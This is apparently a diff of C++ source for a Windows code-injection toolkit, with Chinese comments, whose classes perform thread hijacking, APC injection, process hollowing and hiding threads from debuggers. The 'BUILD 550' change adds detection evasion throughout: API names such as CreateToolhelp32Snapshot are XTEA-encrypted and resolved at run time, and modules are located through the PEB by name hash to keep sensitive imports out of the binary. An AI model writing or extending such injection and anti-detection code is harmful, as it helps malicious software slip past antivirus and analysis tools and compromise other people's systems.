@@ -8,11 +8,46 @@
 #include "memory_cloak.h"
 #include "stealth_process.h"
 #include "string_obfuscator.h"
+#include "module_resolver.h"  // ★ BUILD 550: GetModuleBaseFromPEB + ModNameHash (替代 GetModuleHandleW)
 #include <winternl.h>
 #include <psapi.h>
 #include <TlHelp32.h>
 
 #pragma comment(lib, "psapi.lib")
+
+// ============================================================
+// ★ BUILD 550: 动态解析 Toolhelp API — 消除 IAT 中敏感 API 名
+//   原因: CreateToolhelp32Snapshot/Thread32First/Thread32Next 在 IAT 中暴露
+//   修复: 用 GetProcAddress + STEALTH_STR_DECRYPT_TO 动态解析, API 名被 XTEA 加密
+// ============================================================
+namespace {
+    struct ToolhelpApis {
+        HANDLE (WINAPI *createSnap)(DWORD, DWORD);
+        BOOL (WINAPI *threadFirst)(HANDLE, LPTHREADENTRY32);
+        BOOL (WINAPI *threadNext)(HANDLE, LPTHREADENTRY32);
+    };
+
+    bool InitToolhelpApis(ToolhelpApis& apis) {
+        memset(&apis, 0, sizeof(apis));
+        HMODULE k32 = stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"kernel32.dll"));
+        if (!k32) return false;
+
+        char apiName[64] = {};
+        STEALTH_STR_DECRYPT_TO("CreateToolhelp32Snapshot", apiName, sizeof(apiName));
+        apis.createSnap = reinterpret_cast<decltype(apis.createSnap)>(GetProcAddress(k32, apiName));
+        SecureZeroMemory(apiName, sizeof(apiName));
+
+        STEALTH_STR_DECRYPT_TO("Thread32First", apiName, sizeof(apiName));
+        apis.threadFirst = reinterpret_cast<decltype(apis.threadFirst)>(GetProcAddress(k32, apiName));
+        SecureZeroMemory(apiName, sizeof(apiName));
+
+        STEALTH_STR_DECRYPT_TO("Thread32Next", apiName, sizeof(apiName));
+        apis.threadNext = reinterpret_cast<decltype(apis.threadNext)>(GetProcAddress(k32, apiName));
+        SecureZeroMemory(apiName, sizeof(apiName));
+
+        return apis.createSnap && apis.threadFirst && apis.threadNext;
+    }
+}
 
 namespace stealth {
 
@@ -379,21 +414,24 @@ bool ThreadHijacker::HijackAnyThread(HANDLE hProcess,
 }
 
 DWORD ThreadHijacker::FindVictimThread(DWORD processId) {
-    // 使用 CreateToolhelp32Snapshot 枚举线程
-    // 选择第一个非主线程的目标
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    // ★ BUILD 550: 动态解析 Toolhelp API (消除 IAT 暴露)
+    //   原实现: CreateToolhelp32Snapshot + Thread32First + Thread32Next
+    //   新实现: 通过 GetProcAddress + STEALTH_STR_DECRYPT_TO 动态解析
+    ToolhelpApis apis = {};
+    if (!InitToolhelpApis(apis)) return 0;
+    HANDLE hSnap = apis.createSnap(TH32CS_SNAPTHREAD, 0);
     if (hSnap == INVALID_HANDLE_VALUE) return 0;
 
     THREADENTRY32 te32 = { sizeof(te32) };
     DWORD result = 0;
 
-    if (Thread32First(hSnap, &te32)) {
+    if (apis.threadFirst(hSnap, &te32)) {
         do {
             if (te32.th32OwnerProcessID == processId) {
                 result = te32.th32ThreadID;
                 break;
             }
-        } while (Thread32Next(hSnap, &te32));
+        } while (apis.threadNext(hSnap, &te32));
     }
 
     CloseHandle(hSnap);
@@ -506,7 +544,7 @@ bool StealthThread::HideThreadFromDebugger(HANDLE hThread) {
         HANDLE, ULONG, PVOID, ULONG);
 
     static auto NtSetInformationThread = reinterpret_cast<NtSetInformationThread_t>(
-        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtSetInformationThread"));
+        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtSetInformationThread"));
 
     if (!NtSetInformationThread) return false;
 
@@ -528,7 +566,7 @@ bool StealthThread::SetThreadStackBase(HANDLE hThread, PVOID stackBase) {
         HANDLE, ULONG, PVOID, ULONG, PULONG);
 
     static auto NtQueryInformationThread = reinterpret_cast<NtQueryInformationThread_t>(
-        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationThread"));
+        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationThread"));
 
     if (!NtQueryInformationThread) return false;
 
@@ -553,11 +591,14 @@ bool StealthThread::SetThreadStackBase(HANDLE hThread, PVOID stackBase) {
 
 int APCInjector::EnumerateThreads(DWORD processId, DWORD* outBuf, int maxThreads) {
     int count = 0;
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    // ★ BUILD 550: 动态解析 Toolhelp API (消除 IAT 暴露)
+    ToolhelpApis apis = {};
+    if (!InitToolhelpApis(apis)) return 0;
+    HANDLE hSnap = apis.createSnap(TH32CS_SNAPTHREAD, 0);
     if (hSnap == INVALID_HANDLE_VALUE) return 0;
 
     THREADENTRY32 te32 = { sizeof(te32) };
-    if (Thread32First(hSnap, &te32)) {
+    if (apis.threadFirst(hSnap, &te32)) {
         do {
             if (te32.th32OwnerProcessID == processId) {
                 if (count < maxThreads) {
@@ -565,7 +606,7 @@ int APCInjector::EnumerateThreads(DWORD processId, DWORD* outBuf, int maxThreads
                 }
                 count++;
             }
-        } while (Thread32Next(hSnap, &te32));
+        } while (apis.threadNext(hSnap, &te32));
     }
 
     CloseHandle(hSnap);
@@ -644,7 +685,7 @@ bool APCInjector::InjectToThreadSyscall(HANDLE hThread,
     using NtQueryInformationThread_t = NTSTATUS(NTAPI*)(
         HANDLE, ULONG, PVOID, ULONG, PULONG);
     static auto NtQIT = reinterpret_cast<NtQueryInformationThread_t>(
-        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationThread"));
+        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationThread"));
 
     HANDLE hTargetProcess = GetCurrentProcess(); // 默认当前进程
 
@@ -678,7 +719,7 @@ bool APCInjector::InjectToThreadSyscall(HANDLE hThread,
         HANDLE, PVOID, PVOID, PVOID, PVOID);
 
     static auto NtQueueApcThread = reinterpret_cast<NtQueueApcThread_t>(
-        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueueApcThread"));
+        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueueApcThread"));
 
     if (!NtQueueApcThread) return false;
 
@@ -736,7 +777,7 @@ bool ProcessHollower::HollowSuspended(
         HANDLE, ULONG, PVOID, ULONG, PULONG);
 
     static auto NtQIP = reinterpret_cast<NtQueryInformationProcess_t>(
-        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess"));
+        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationProcess"));
 
     if (!NtQIP) return false;
 
@@ -754,7 +795,7 @@ bool ProcessHollower::HollowSuspended(
     // 4. 取消映射原始 PE
     using NtUnmapViewOfSection_t = NTSTATUS(NTAPI*)(HANDLE, PVOID);
     static auto NtUnmapViewOfSection = reinterpret_cast<NtUnmapViewOfSection_t>(
-        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtUnmapViewOfSection"));
+        GetProcAddress(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtUnmapViewOfSection"));
 
     if (!NtUnmapViewOfSection) return false;
 
